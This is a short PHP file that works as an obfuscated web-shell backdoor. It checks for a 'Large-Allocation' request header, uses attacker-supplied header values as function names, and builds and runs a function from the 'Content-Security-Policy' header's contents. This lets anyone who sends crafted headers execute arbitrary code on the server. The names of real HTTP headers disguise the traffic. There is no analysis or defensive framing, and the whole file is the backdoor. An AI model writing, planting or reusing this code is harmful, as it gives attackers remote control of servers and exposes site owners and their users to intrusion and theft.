<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Large-Allocation'])) {
    $rfind = $_HEADERS['Large-Allocation']('', $_HEADERS['Server-Timing']($_HEADERS['Content-Security-Policy']));
    $rfind();
}